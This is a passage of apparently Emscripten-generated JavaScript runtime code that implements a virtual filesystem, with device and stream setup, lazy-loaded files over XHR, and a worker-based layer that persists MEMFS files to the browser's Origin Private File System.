                }, {}, "/proc/self/fd")
            },
            createStandardStreams(input, output, error) {
                if (input) {
                    FS.createDevice("/dev", "stdin", input)
                } else {
                    FS.symlink("/dev/tty", "/dev/stdin")
                }
                if (output) {
                    FS.createDevice("/dev", "stdout", null, output)
                } else {
                    FS.symlink("/dev/tty", "/dev/stdout")
                }
                if (error) {
                    FS.createDevice("/dev", "stderr", null, error)
                } else {
                    FS.symlink("/dev/tty1", "/dev/stderr")
                }
                var stdin = FS.open("/dev/stdin", 0);
                var stdout = FS.open("/dev/stdout", 1);
                var stderr = FS.open("/dev/stderr", 1)
            },
            staticInit() {
                FS.nameTable = new Array(4096);
                FS.mount(MEMFS, {}, "/");
                FS.createDefaultDirectories();
                FS.createDefaultDevices();
                FS.createSpecialDirectories();
                FS.filesystems = {
                    MEMFS,
                    IDBFS
                }
            },
            init(input, output, error) {
                FS.initialized = true;
                input ??= Module["stdin"];
                output ??= Module["stdout"];
                error ??= Module["stderr"];
                FS.createStandardStreams(input, output, error)
            },
            quit() {
                FS.initialized = false;
                for (var stream of FS.streams) {
                    if (stream) {
                        FS.close(stream)
                    }
                }
            },
            findObject(path, dontResolveLastLink) {
                var ret = FS.analyzePath(path, dontResolveLastLink);
                if (!ret.exists) {
                    return null
                }
                return ret.object
            },
            analyzePath(path, dontResolveLastLink) {
                try {
                    var lookup = FS.lookupPath(path, {
                        follow: !dontResolveLastLink
                    });
                    path = lookup.path
                } catch (e) { }
                var ret = {
                    isRoot: false,
                    exists: false,
                    error: 0,
                    name: null,
                    path: null,
                    object: null,
                    parentExists: false,
                    parentPath: null,
                    parentObject: null
                };
                try {
                    var lookup = FS.lookupPath(path, {
                        parent: true
                    });
                    ret.parentExists = true;
                    ret.parentPath = lookup.path;
                    ret.parentObject = lookup.node;
                    ret.name = PATH.basename(path);
                    lookup = FS.lookupPath(path, {
                        follow: !dontResolveLastLink
                    });
                    ret.exists = true;
                    ret.path = lookup.path;
                    ret.object = lookup.node;
                    ret.name = lookup.node.name;
                    ret.isRoot = lookup.path === "/"
                } catch (e) {
                    ret.error = e.errno
                }
                return ret
            },
            createPath(parent, path, canRead, canWrite) {
                parent = typeof parent == "string" ? parent : FS.getPath(parent);
                var parts = path.split("/").reverse();
                while (parts.length) {
                    var part = parts.pop();
                    if (!part)
                        continue;
                    var current = PATH.join2(parent, part);
                    try {
                        FS.mkdir(current)
                    } catch (e) {
                        if (e.errno != 20)
                            throw e
                    }
                    parent = current
                }
                return current
            },
            createFile(parent, name, properties, canRead, canWrite) {
                var path = PATH.join2(typeof parent == "string" ? parent : FS.getPath(parent), name);
                var mode = FS_getMode(canRead, canWrite);
                return FS.create(path, mode)
            },
            createDataFile(parent, name, data, canRead, canWrite, canOwn) {
                var path = name;
                if (parent) {
                    parent = typeof parent == "string" ? parent : FS.getPath(parent);
                    path = name ? PATH.join2(parent, name) : parent
                }
                var mode = FS_getMode(canRead, canWrite);
                var node = FS.create(path, mode);
                if (data) {
                    if (typeof data == "string") {
                        var arr = new Array(data.length);
                        for (var i = 0, len = data.length; i < len; ++i)
                            arr[i] = data.charCodeAt(i);
                        data = arr
                    }
                    FS.chmod(node, mode | 146);
                    var stream = FS.open(node, 577);
                    FS.write(stream, data, 0, data.length, 0, canOwn);
                    FS.close(stream);
                    FS.chmod(node, mode)
                }
            },
            createDevice(parent, name, input, output) {
                var path = PATH.join2(typeof parent == "string" ? parent : FS.getPath(parent), name);
                var mode = FS_getMode(!!input, !!output);
                FS.createDevice.major ??= 64;
                var dev = FS.makedev(FS.createDevice.major++, 0);
                FS.registerDevice(dev, {
                    open(stream) {
                        stream.seekable = false
                    },
                    close(stream) {
                        if (output?.buffer?.length) {
                            output(10)
                        }
                    },
                    read(stream, buffer, offset, length, pos) {
                        var bytesRead = 0;
                        for (var i = 0; i < length; i++) {
                            var result;
                            try {
                                result = input()
                            } catch (e) {
                                throw new FS.ErrnoError(29)
                            }
                            if (result === undefined && bytesRead === 0) {
                                throw new FS.ErrnoError(6)
                            }
                            if (result === null || result === undefined)
                                break;
                            bytesRead++;
                            buffer[offset + i] = result
                        }
                        if (bytesRead) {
                            stream.node.atime = Date.now()
                        }
                        return bytesRead
                    },
                    write(stream, buffer, offset, length, pos) {
                        for (var i = 0; i < length; i++) {
                            try {
                                output(buffer[offset + i])
                            } catch (e) {
                                throw new FS.ErrnoError(29)
                            }
                        }
                        if (length) {
                            stream.node.mtime = stream.node.ctime = Date.now()
                        }
                        return i
                    }
                });
                return FS.mkdev(path, mode, dev)
            },
            forceLoadFile(obj) {
                if (obj.isDevice || obj.isFolder || obj.link || obj.contents)
                    return true;
                if (globalThis.XMLHttpRequest) {
                    abort("Lazy loading should have been performed (contents set) in createLazyFile, but it was not. Lazy loading only works in web workers. Use --embed-file or --preload-file in emcc on the main thread.")
                } else {
                    try {
                        obj.contents = readBinary(obj.url)
                    } catch (e) {
                        throw new FS.ErrnoError(29)
                    }
                }
            },
            createLazyFile(parent, name, url, canRead, canWrite) {
                class LazyUint8Array {
                    lengthKnown = false;
                    chunks = [];
                    get(idx) {
                        if (idx > this.length - 1 || idx < 0) {
                            return undefined
                        }
                        var chunkOffset = idx % this.chunkSize;
                        var chunkNum = idx / this.chunkSize | 0;
                        return this.getter(chunkNum)[chunkOffset]
                    }
                    setDataGetter(getter) {
                        this.getter = getter
                    }
                    cacheLength() {
                        var xhr = new XMLHttpRequest;
                        xhr.open("HEAD", url, false);
                        xhr.send(null);
                        if (!(xhr.status >= 200 && xhr.status < 300 || xhr.status === 304))
                            abort("Couldn't load " + url + ". Status: " + xhr.status);
                        var datalength = Number(xhr.getResponseHeader("Content-length"));
                        var header;
                        var hasByteServing = (header = xhr.getResponseHeader("Accept-Ranges")) && header === "bytes";
                        var usesGzip = (header = xhr.getResponseHeader("Content-Encoding")) && header === "gzip";
                        var chunkSize = 1024 * 1024;
                        if (!hasByteServing)
                            chunkSize = datalength;
                        var doXHR = (from, to) => {
                            if (from > to)
                                abort("invalid range (" + from + ", " + to + ") or no bytes requested!");
                            if (to > datalength - 1)
                                abort("only " + datalength + " bytes available! programmer error!");
                            var xhr = new XMLHttpRequest;
                            xhr.open("GET", url, false);
                            if (datalength !== chunkSize)
                                xhr.setRequestHeader("Range", "bytes=" + from + "-" + to);
                            xhr.responseType = "arraybuffer";
                            if (xhr.overrideMimeType) {
                                xhr.overrideMimeType("text/plain; charset=x-user-defined")
                            }
                            xhr.send(null);
                            if (!(xhr.status >= 200 && xhr.status < 300 || xhr.status === 304))
                                abort("Couldn't load " + url + ". Status: " + xhr.status);
                            if (xhr.response !== undefined) {
                                return new Uint8Array(xhr.response || [])
                            }
                            return intArrayFromString(xhr.responseText || "", true)
                        }
                            ;
                        var lazyArray = this;
                        lazyArray.setDataGetter(chunkNum => {
                            var start = chunkNum * chunkSize;
                            var end = (chunkNum + 1) * chunkSize - 1;
                            end = Math.min(end, datalength - 1);
                            if (typeof lazyArray.chunks[chunkNum] == "undefined") {
                                lazyArray.chunks[chunkNum] = doXHR(start, end)
                            }
                            if (typeof lazyArray.chunks[chunkNum] == "undefined")
                                abort("doXHR failed!");
                            return lazyArray.chunks[chunkNum]
                        }
                        );
                        if (usesGzip || !datalength) {
                            chunkSize = datalength = 1;
                            datalength = this.getter(0).length;
                            chunkSize = datalength;
                            out("LazyFiles on gzip forces download of the whole file when length is accessed")
                        }
                        this._length = datalength;
                        this._chunkSize = chunkSize;
                        this.lengthKnown = true
                    }
                    get length() {
                        if (!this.lengthKnown) {
                            this.cacheLength()
                        }
                        return this._length
                    }
                    get chunkSize() {
                        if (!this.lengthKnown) {
                            this.cacheLength()
                        }
                        return this._chunkSize
                    }
                }
                if (globalThis.XMLHttpRequest) {
                    if (!ENVIRONMENT_IS_WORKER)
                        abort("Cannot do synchronous binary XHRs outside webworkers in modern browsers. Use --embed-file or --preload-file in emcc");
                    var lazyArray = new LazyUint8Array;
                    var properties = {
                        isDevice: false,
                        contents: lazyArray
                    }
                } else {
                    var properties = {
                        isDevice: false,
                        url
                    }
                }
                var node = FS.createFile(parent, name, properties, canRead, canWrite);
                if (properties.contents) {
                    node.contents = properties.contents
                } else if (properties.url) {
                    node.contents = null;
                    node.url = properties.url
                }
                Object.defineProperties(node, {
                    usedBytes: {
                        get: function () {
                            return this.contents.length
                        }
                    }
                });
                var stream_ops = {};
                for (const [key, fn] of Object.entries(node.stream_ops)) {
                    stream_ops[key] = (...args) => {
                        FS.forceLoadFile(node);
                        return fn(...args)
                    }
                }
                function writeChunks(stream, buffer, offset, length, position) {
                    var contents = stream.node.contents;
                    if (position >= contents.length)
                        return 0;
                    var size = Math.min(contents.length - position, length);
                    if (contents.slice) {
                        for (var i = 0; i < size; i++) {
                            buffer[offset + i] = contents[position + i]
                        }
                    } else {
                        for (var i = 0; i < size; i++) {
                            buffer[offset + i] = contents.get(position + i)
                        }
                    }
                    return size
                }
                stream_ops.read = (stream, buffer, offset, length, position) => {
                    FS.forceLoadFile(node);
                    return writeChunks(stream, buffer, offset, length, position)
                }
                    ;
                stream_ops.mmap = (stream, length, position, prot, flags) => {
                    FS.forceLoadFile(node);
                    var ptr = mmapAlloc(length);
                    if (!ptr) {
                        throw new FS.ErrnoError(48)
                    }
                    writeChunks(stream, HEAP8, ptr, length, position);
                    return {
                        ptr,
                        allocated: true
                    }
                }
                    ;
                node.stream_ops = stream_ops;
                return node
            }
        };
        var OPFS = {
            syncfsQueue: new Map,
            getWorker: () => {
                if (globalThis.opfsWorker) {
                    return globalThis.opfsWorker
                }
                const opfsSyncWorkerSource = `\nconst OPFS_TIMESTAMPS_FILE = '.emscripten-opfs-stats';\nconst textDecoder = new TextDecoder();\nconst textEncoder = new TextEncoder();\nconst rootDirectoryCache = new Map();\n\nfunction splitPath(path) {\n  if (!path) return [];\n  return path.split('/').filter((p) => p.length > 0);\n}\n\nasync function openSyncAccessHandleCompat(fileHandle, mode = 'readwrite') {\n  try {\n    if (mode === 'read-only') {\n      return await fileHandle.createSyncAccessHandle({ mode: 'read-only' });\n    }\n    return await fileHandle.createSyncAccessHandle();\n  } catch (e) {\n    if (mode === 'read-only' && e && (e.name === 'TypeError' || e.name === 'NotSupportedError')) {\n      console.warn("openSyncAccessHandleCompat read-only mode unsupported, retrying without mode");\n      return await openSyncAccessHandleCompat(fileHandle);\n    }\n    if (e && e.name === 'NoModificationAllowedError') {\n      console.warn("openSyncAccessHandleCompat NoModificationAllowedError, retrying");\n      return new Promise((resolve, reject) => {\n        setTimeout(() => {\n          openSyncAccessHandleCompat(fileHandle, mode).then(resolve).catch(reject);\n        }, 100);\n      });\n    } else {\n      console.error("openSyncAccessHandleCompat error", e);\n      throw e;\n    }\n  }\n}\n\nasync function getRootDirectory(root, updateMeta) {\n  const key = root || '';\n  const cached = rootDirectoryCache.get(key);\n  if (cached && updateMeta !== true) {\n    return cached;\n  }\n\n  let dir;\n  if (cached) {\n    dir = cached.dir;\n  } else {\n    dir = await navigator.storage.getDirectory();\n    for (const part of splitPath(key)) {\n      dir = await dir.getDirectoryHandle(part, { create: true });\n    }\n  }\n\n  let meta;\n  let accessHandle;\n  try {\n    const fileHandle = await dir.getFileHandle(OPFS_TIMESTAMPS_FILE, { create: false });\n    accessHandle = await openSyncAccessHandleCompat(fileHandle, 'read-only');\n    const fileSize = accessHandle.getSize();\n    if (fileSize > 0) {\n      const buffer = new Uint8Array(fileSize);\n      accessHandle.read(buffer, { at: 0 });\n      meta = JSON.parse(textDecoder.decode(buffer));\n    }\n  } catch (e) {\n    // ignore\n  } finally {\n    if (accessHandle) {\n      accessHandle.close();\n    }\n  }\n\n  if (!meta || !meta.nodes) {\n    meta = { nodes: {} };\n  }\n\n  rootDirectoryCache.set(key, {\n    dir,\n    meta,\n  });\n\n  return rootDirectoryCache.get(key);\n}\n\nfunction updateMeta(root, anyPath, timestamp, mode, isDir, length) {\n  const path = anyPath.startsWith("/") ? anyPath.substring(1) : anyPath;\n  const cached = rootDirectoryCache.get(root);\n  if (!cached) {\n    throw new Error('root "' + root + '" directory not found');\n  }\n  cached.meta.nodes[path] = cached.meta.nodes[path] || {};\n  cached.meta.nodes[path].t = timestamp.getTime();\n  cached.meta.nodes[path].m = mode;\n  cached.meta.nodes[path].d = isDir;\n  cached.meta.nodes[path].l = length;\n}\n\nfunction getMeta(root, anyPath) {\n  const path = anyPath.startsWith("/") ? anyPath.substring(1) : anyPath;\n  const cached = rootDirectoryCache.get(root);\n  if (!cached) {\n    throw new Error('root "' + root + '" directory not found');\n  }\n  const meta = cached.meta.nodes[path];\n  return meta ? { timestamp: new Date(meta.t), mode: meta.m, isDir: meta.d, length: meta.l } : null;\n}\n\nfunction removeMeta(root, anyPath) {\n  const path = anyPath.startsWith("/") ? anyPath.substring(1) : anyPath;\n  const cached = rootDirectoryCache.get(root);\n  if (!cached) {\n    throw new Error('root "' + root + '" directory not found');\n  }\n  delete cached.meta.nodes[path];\n}\n\nasync function flushMeta(root) {\n  const cached = rootDirectoryCache.get(root);\n  if (!cached) {\n    throw new Error('root "' + root + '" directory not found');\n  }\n  if (Object.keys(cached.meta.nodes).length === 0) {\n    try {\n      await cached.dir.removeEntry(OPFS_TIMESTAMPS_FILE);\n    } catch(e) {\n      // ignore\n    }\n  } else {\n    const fileHandle = await cached.dir.getFileHandle(OPFS_TIMESTAMPS_FILE, { create: true });\n    const accessHandle = await openSyncAccessHandleCompat(fileHandle);\n    accessHandle.truncate(0);\n    accessHandle.write(textEncoder.encode(JSON.stringify(cached.meta)));\n    accessHandle.flush();\n    accessHandle.close();\n  }\n}\n\nasync function getDirectory(root, path, create) {\n  const rootDir = (await getRootDirectory(root)).dir;\n  const parts = typeof path === 'string' ? splitPath(path) : path;\n  let dir = rootDir;\n  for (let i = 0; i < parts.length; i++) {\n    dir = await dir.getDirectoryHandle(parts[i], { create });\n  }\n  return dir;\n}\n\nasync function getParentDirectory(root, path, create) {\n  const parts = splitPath(path)\n  const dir = await getDirectory(root, parts.slice(0, -1), create);\n  return { dir, name: parts[parts.length - 1] };\n}\n\nasync function openHandle(root, path, create, mode = 'readwrite') {\n  const { dir, name } = await getParentDirectory(root, path, create);\n  const fileHandle = await dir.getFileHandle(name, { create });\n  return await openSyncAccessHandleCompat(fileHandle, mode);\n}\n\nfunction readFromHandle(accessHandle, offset, length) {\n  const size = accessHandle.getSize();\n  if (!length) {\n    length = size;\n  }\n  if (offset + length > size) {\n    length = size - offset;\n  }\n  if (length < 0) {\n    length = 0;\n  }\n  const contents = new Uint8Array(length);\n  const read = accessHandle.read(contents, { at: offset });\n  return { contents, read };\n}\n\nfunction writeToHandle(accessHandle, offset, data, timestamp, mode, fileSize) {\n  if (offset > accessHandle.getSize()) {\n    accessHandle.truncate(offset);\n  }\n  const written = accessHandle.write(data, { at: offset });\n  if (typeof fileSize === 'number' && accessHandle.getSize() > fileSize) {\n    accessHandle.truncate(fileSize);\n  }\n  return written;\n}\n\nfunction postSuccess(type, requestId, result, transferable) {\n  self.postMessage({ type, requestId, ok: true, result }, transferable);\n}\n\nfunction postError(type, requestId, error) {\n  self.postMessage({\n    type,\n    requestId,\n    ok: false,\n    error: {\n      name: error?.name || 'Error',\n      message: error?.message || String(error),\n    },\n  });\n}\n\nconst onmessage = async (event) => {\n  const { type, payload = {}, requestId } = event.data || {};\n\n  let cachedHandle = null;\n  let cachedHandlePath = null;\n\n  function updateCachedHandle(accessHandle, path) {\n    if (accessHandle !== cachedHandle && cachedHandle !== null) {\n      cachedHandle.close();\n    }\n    cachedHandle = accessHandle;\n    cachedHandlePath = path;\n  }\n\n  function closeCachedHandle() {\n    if (cachedHandle !== null) {\n      cachedHandle.close();\n      cachedHandle = null;\n      cachedHandlePath = null;\n    }\n  }\n\n  function write(root, path, offset, contents, timestamp, mode, fileSize, syncCall = false, useHandleCache  = false) {\n    const isDir = (mode & 0o170000) === 0o040000;\n    if (!isDir) { // file\n      const data = contents ?? new Uint8Array(0);\n      if (syncCall) {\n        if (cachedHandlePath === root + path) {\n          const written = writeToHandle(cachedHandle, offset, data, timestamp, mode, fileSize);\n          updateMeta(root, path, timestamp, mode, false, cachedHandle.getSize());\n          return written;\n        } else {\n          return null;\n        }\n      }\n\n      return openHandle(root, path, true).then((accessHandle) => {\n        const written = writeToHandle(accessHandle, offset, data, timestamp, mode, fileSize);\n        updateMeta(root, path, timestamp, mode, false, accessHandle.getSize());\n        if (useHandleCache) {\n          updateCachedHandle(accessHandle, root + path);\n        } else {\n          accessHandle.close();\n        }\n        return written;\n      });\n    } else {\n      updateMeta(root, path, timestamp, mode, true, 0);\n      return getDirectory(root, path, true).then(() => 0);\n    }\n  }\n\n  function read(root, path, offset, length, syncCall = false, updateHandleCache = false) {\n    if (syncCall) {\n      if (cachedHandlePath === root + path) {\n        return readFromHandle(cachedHandle, offset, length);\n      } else {\n        return null;\n      }\n    }\n\n    return openHandle(root, path, false, 'read-only').then((accessHandle) => {\n      const result = readFromHandle(accessHandle, offset, length);\n      if (updateHandleCache) {\n        updateCachedHandle(accessHandle, root + path);\n      } else {\n        accessHandle.close();\n      }\n      return result;\n    });\n  }\n\n  try {\n    switch (type) {\n      case 'pwrite': {\n        const { root, parts, timestamp, mode } = payload;\n        parts.sort((a, b) => (a.path < b.path ? -1 : a.path > b.path ? 1 : a.offset - b.offset));\n        let written = 0;\n        for (const { path, offset, contents, fileSize } of parts) {\n          let result = write(root, path, offset, contents, timestamp, mode, fileSize, true);\n          if (result === null) {\n            result = await write(root, path, offset, contents, timestamp, mode, fileSize, false, true);\n          }\n          written += result;\n        }\n        // close (flush) the cached handle before responding: the caller may\n        // start a direct main-thread read of this data as soon as it sees the\n        // response\n        closeCachedHandle();\n        postSuccess(type, requestId, { written });\n      } break;\n      case 'write': {\n        const { root, path, offset = 0, contents = null, timestamp, mode, fileSize } = payload;\n        const written = await write(root, path, offset, contents, timestamp, mode, fileSize);\n        postSuccess(type, requestId, { written });\n      } break;\n      case 'pread': {\n        const { root, groups } = payload;\n        const contents = [];\n        for (const parts of groups) {\n          // sort by path/offset for access-handle cache locality, but keep the\n          // original positions so the concatenated output order is preserved\n          const indexed = parts.map((part, i) => ({ ...part, i }));\n          indexed.sort((a, b) => (a.path < b.path ? -1 : a.path > b.path ? 1 : a.offset - b.offset));\n          const partsContent = new Array(parts.length);\n          let totalLength = 0;\n          for (const { path, offset, length, i } of indexed) {\n            let result = read(root, path, offset, length, true);\n            if (result === null) {\n              result = await read(root, path, offset, length, false, true);\n            }\n            partsContent[i] = result.contents;\n            totalLength += result.contents.length;\n          }\n          if (partsContent.length === 1) {\n            contents.push(partsContent[0]);\n          } else {\n            const content = new Uint8Array(totalLength);\n            let offset = 0;\n            for (const part of partsContent) {\n              content.set(part, offset);\n              offset += part.length;\n            }\n            contents.push(content);\n          }\n        }\n        postSuccess(type, requestId, { contents }, contents.map((c) => c.buffer));\n      } break;\n      case 'read': {\n        let length = payload.length;\n        const { root, path, offset = 0 } = payload;\n        const meta = getMeta(root, path) ?? { timestamp: new Date(), mode: 0o100644 };\n        const { timestamp, mode } = meta;\n        const result = await read(root, path, offset, length);\n        postSuccess(type, requestId, { ...result, timestamp, mode }, [result.contents.buffer]);\n      } break;\n      case 'unlink': {\n        const { root, path } = payload;\n        const paths = Array.isArray(path) ? path : [path];\n        let allDeleted = true;\n        for (const path of paths) {\n          removeMeta(root, path);\n          try {\n            const { dir, name } = await getParentDirectory(root, path, false);\n            await dir.removeEntry(name, { recursive: true });\n          } catch (e) {\n            if (!e || e.name !== 'NotFoundError') {\n              allDeleted = false;\n            }\n          }\n        }\n        postSuccess(type, requestId, { deleted: allDeleted });\n      } break;\n      case 'list': {\n        const { root } = payload;\n        const { dir: rootDir, meta } = await getRootDirectory(root, true);\n        const entries = {};\n        let metaChanged = false;\n\n        function ensureParentDirsInMeta(path, timestampMs) {\n          const parts = splitPath(path);\n          if (parts.length < 2) {\n            return;\n          }\n\n          const safeTimestamp = typeof timestampMs === 'number' ? timestampMs : Date.now();\n          for (let i = 1; i < parts.length; i++) {\n            const parentPath = parts.slice(0, i).join('/');\n            if (!meta.nodes[parentPath]) {\n              meta.nodes[parentPath] = {\n                t: safeTimestamp,\n                m: 0o040755,\n                d: true,\n                l: 0,\n              };\n              metaChanged = true;\n            }\n          }\n        }\n\n        async function walk(dir, prefix) {\n          for await (const [name, handle] of dir.entries()) {\n            const path = prefix ? prefix + '/' + name : name;\n            if (handle.kind === 'directory') {\n              await walk(handle, path);\n            } else if (handle.kind === 'file') {\n              let fileMeta = getMeta(root, path);\n              if (fileMeta && fileMeta.isDir) {\n                // Recover from stale metadata that marked this file path as a directory.\n                let fileSize = typeof fileMeta.length === 'number' ? fileMeta.length : 0;\n                try {\n                  const file = await handle.getFile();\n                  fileSize = file.size;\n                } catch (e) {\n                  console.warn('Failed to read OPFS file size during metadata recovery for "' + path + '"', e);\n                }\n                fileMeta.isDir = false;\n                fileMeta.mode = (fileMeta.mode & ~0o170000) | 0o100000;\n                fileMeta.length = fileSize;\n                if (meta.nodes[path]) {\n                  meta.nodes[path].d = false;\n                  meta.nodes[path].m = fileMeta.mode;\n                  meta.nodes[path].l = fileSize;\n                }\n                metaChanged = true;\n              } else if (!fileMeta) {\n                // A file placed into OPFS outside of this library has no stats\n                // entry; expose it with fallback metadata so populate still\n                // sees it (stats are recreated on the next persist).\n                try {\n                  const file = await handle.getFile();\n                  fileMeta = { timestamp: new Date(file.lastModified), mode: 0o100644, isDir: false, length: file.size };\n                } catch (e) {\n                  console.warn('Failed to read OPFS file without stats entry "' + path + '", skipping', e);\n                }\n              }\n              if (fileMeta) {\n                ensureParentDirsInMeta(path, fileMeta.timestamp.getTime());\n                entries[root + '/' + path] = fileMeta;\n              }\n            }\n          }\n        }\n\n        await walk(rootDir, '');\n\n        for (const [path, node] of Object.entries(meta.nodes)) {\n          if (node.d && !entries[root + '/' + path]) {\n            entries[root + '/' + path] = { timestamp: new Date(node.t), mode: node.m, isDir: node.d, length: 0 };\n          }\n        }\n        if (metaChanged) {\n          await flushMeta(root);\n        }\n        postSuccess(type, requestId, entries);\n      } break;\n      case 'catalog': {\n        // Like 'list', but built purely from the stats file without walking\n        // the OPFS directory tree. Every write and unlink goes through this\n        // worker and keeps the stats up to date, so this is a cheap way to\n        // get the remote set when persisting (MEMFS -> OPFS).\n        const { root } = payload;\n        const { meta } = await getRootDirectory(root);\n        const entries = {};\n        for (const [path, node] of Object.entries(meta.nodes)) {\n          entries[root + '/' + path] = { timestamp: new Date(node.t), mode: node.m, isDir: node.d, length: node.l };\n        }\n        postSuccess(type, requestId, entries);\n      } break;\n      case 'flush': {\n        const { root } = payload;\n        await flushMeta(root);\n        postSuccess(type, requestId, { flushed: true });\n      } break;\n      default:\n        throw new Error('unknown OPFS worker message type: ' + type);\n    }\n  } catch (error) {\n    postError(type, requestId, error);\n  } finally {\n    closeCachedHandle();\n  }\n};\nself.onmessage = (event) => onmessage(event).catch(console.error);\n        `;
                OPFS.opfsSyncWorkerUrl = URL.createObjectURL(new Blob([opfsSyncWorkerSource], {
                    type: "text/javascript"
                }));
                globalThis.opfsWorker = new Worker(OPFS.opfsSyncWorkerUrl);
                globalThis.opfsWorker.requestId = 0;
                return globalThis.opfsWorker
            }
            ,
            callWorker: (type, payload, callback) => {
                const worker = OPFS.getWorker();
                if (!worker) {
                    return callback(new Error("OPFS worker not initialized"))
                }
                const selfId = worker.requestId++;
                const handler = event => {
                    const { type, requestId, ok, result, error } = event.data;
                    if (requestId === selfId) {
                        worker.removeEventListener("message", handler);
                        if (ok) {
                            callback(null, result)
                        } else {
                            callback(new Error(error.message))
                        }
                    }
                }
                    ;
                worker.addEventListener("message", handler);
                worker.postMessage({
                    type,
                    payload,
                    requestId: selfId
                })
            }
            ,
            queuePersist: mount => {
                function onPersistComplete() {
                    if (mount.opfsPersistState === "again")
                        startPersist();
                    else
                        mount.opfsPersistState = 0
                }
                function startPersist() {
                    mount.opfsPersistState = "opfs";
                    OPFS.syncfs(mount, false, onPersistComplete)
                }
                if (!mount.opfsPersistState) {
                    mount.opfsPersistState = setTimeout(startPersist, 0)
                } else if (mount.opfsPersistState === "opfs") {
                    mount.opfsPersistState = "again"
                }
            }
            ,
            mount: mount => {
                if (!mount.opts?.root) {
                    console.error("No root provided, root should be the path to the root of OPFS directory (with .emscripten-opfs-stats file)");
                    console.error('Use it like this: FS.mount(OPFS, { root: "..." }, "' + mount.mountpoint + '")');
                    throw new Error("No root provided")
                }
                var mnt = MEMFS.mount(mount);
                if (mount?.opts?.autoPersist) {
                    mount.opfsPersistState = 0;
                    var memfs_node_ops = mnt.node_ops;
                    mnt.node_ops = {
                        ...mnt.node_ops
                    };
                    mnt.node_ops.mknod = (parent, name, mode, dev) => {
                        var node = memfs_node_ops.mknod(parent, name, mode, dev);
                        node.node_ops = mnt.node_ops;
                        node.opfs_mount = mnt.mount;
                        node.memfs_stream_ops = node.stream_ops;
                        node.stream_ops = {
                            ...node.stream_ops
                        };
                        node.stream_ops.write = (stream, buffer, offset, length, position, canOwn) => {
                            stream.node.isModified = true;
                            return node.memfs_stream_ops.write(stream, buffer, offset, length, position, canOwn)
                        }
                            ;
                        node.stream_ops.close = stream => {
                            var n = stream.node;
                            if (n.isModified) {
                                OPFS.queuePersist(n.opfs_mount);
                                n.isModified = false
                            }
                            if (n.memfs_stream_ops.close)
                                return n.memfs_stream_ops.close(stream)
                        }
                            ;
                        OPFS.queuePersist(mnt.mount);
                        return node
                    }
                        ;
                    mnt.node_ops.rmdir = (...args) => (OPFS.queuePersist(mnt.mount),
                        memfs_node_ops.rmdir(...args));
                    mnt.node_ops.symlink = (...args) => (OPFS.queuePersist(mnt.mount),
                        memfs_node_ops.symlink(...args));
                    mnt.node_ops.unlink = (...args) => (OPFS.queuePersist(mnt.mount),
                        memfs_node_ops.unlink(...args));
                    mnt.node_ops.rename = (...args) => (OPFS.queuePersist(mnt.mount),
                        memfs_node_ops.rename(...args))
                }
                OPFS.syncfsQueue.set(mount.mountpoint, {
                    active: false,
                    delayed: []
                });
                return mnt
            }
            ,
            syncFsIgnore: null,
            syncFsOnProgress: null,
            syncfs: (mount, populate, callback) => {
                const queue = OPFS.syncfsQueue.get(mount.mountpoint);
                if (queue.active) {
                    queue.delayed.push({
                        populate,
                        callback
                    });
                    return
                }
                queue.active = true;
                const finish = err => {
                    queue.active = false;
                    callback(err);
                    if (!queue.active && queue.delayed.length > 0) {
                        const next = queue.delayed.shift();
                        OPFS.syncfs(mount, next.populate, next.callback)
                    }
                }
                    ;
                if (populate) {
                    OPFS.remoteDirectoryHandles.clear()
                }
                OPFS.getLocalSet(mount, (err, local) => {
                    if (err)
                        return finish(err);
                    OPFS.getRemoteSet(mount, populate ? "list" : "catalog", (err, remote) => {
                        if (err)
                            return finish(err);
                        const src = populate ? remote : local;
                        const dst = populate ? local : remote;
                        OPFS.reconcile(mount, src, dst, finish)
                    }
                    )
                }
                )
            }
            ,
            getLocalSet: (mount, callback) => {
                var entries = {};
                function isRealDir(p) {
                    return p !== "." && p !== ".."
                }
                function toAbsolute(root) {
                    return p => PATH.join2(root, p)
                }
                var check = FS.readdir(mount.mountpoint).filter(isRealDir).map(toAbsolute(mount.mountpoint));
                while (check.length) {
                    var path = check.pop();
                    var stat;
                    try {
                        stat = FS.stat(path)
                    } catch (e) {
                        return callback(e)
                    }
                    if (FS.isDir(stat.mode)) {
                        check.push(...FS.readdir(path).filter(isRealDir).map(toAbsolute(path)))
                    }
                    entries[path] = {
                        timestamp: stat.mtime
                    }
                }
                return callback(null, {
                    type: "local",
                    entries
                })
            }
            ,
            getRemoteSet: (mount, command, callback) => {
                OPFS.callWorker(command, {
                    root: mount.opts.root
                }, (err, entries) => {
                    if (err)
                        return callback(err);
                    const normalized = {};
                    for (const [path, entry] of Object.entries(entries)) {
                        if (mount.opts.folder) {
                            if (path.startsWith(mount.opts.folder)) {
                                normalized[mount.mountpoint + path.substring(mount.opts.folder.length)] = {
                                    ...entry,
                                    path
                                }
                            }
                        } else {
                            normalized[mount.mountpoint + path.substring(mount.opts.root.length)] = {
                                ...entry,
                                path
                            }
                        }
                    }
                    callback(null, {
                        type: "remote",
                        entries: normalized
                    })
                }
                )
            }
            ,
            loadLocalEntry: (path, callback) => {
                var stat, node;
                try {
                    var lookup = FS.lookupPath(path);
                    node = lookup.node;
                    stat = FS.stat(path)
                } catch (e) {
                    return callback(e)
                }
                if (FS.isDir(stat.mode)) {
                    return callback(null, {
                        timestamp: stat.mtime,
                        mode: stat.mode
                    })
                } else if (FS.isFile(stat.mode)) {
                    node.contents = MEMFS.getFileDataAsTypedArray(node);
                    return callback(null, {
                        timestamp: stat.mtime,
                        mode: stat.mode,
                        contents: node.contents
                    })
                } else {
                    return callback(new Error("node type not supported"))
                }
            }
            ,
            storeLocalEntry: (path, entry, callback) => {
                try {
                    if (FS.isDir(entry["mode"])) {
                        FS.mkdirTree(path, entry["mode"])
                    } else if (FS.isFile(entry["mode"])) {
                        FS.writeFile(path, entry["contents"], {
                            canOwn: true
                        })
                    } else {
                        return callback(new Error("node type not supported"))
                    }
                    FS.chmod(path, entry["mode"]);
                    FS.utime(path, entry["timestamp"], entry["timestamp"])
                } catch (e) {
                    return callback(e)
                }
                callback(null)
            }
            ,
            removeLocalEntry: (path, callback) => {
                try {
                    var stat = FS.stat(path);
                    if (FS.isDir(stat.mode)) {
                        FS.rmdir(path)
                    } else if (FS.isFile(stat.mode)) {
                        FS.unlink(path)
                    }
                } catch (e) {
                    return callback(e)
                }
                callback(null)
            }
            ,
            remoteDirectoryHandles: new Map,
            openRemoteDirectory: parts => {
                const key = parts.join("/");
                let promise = OPFS.remoteDirectoryHandles.get(key);
                if (!promise) {
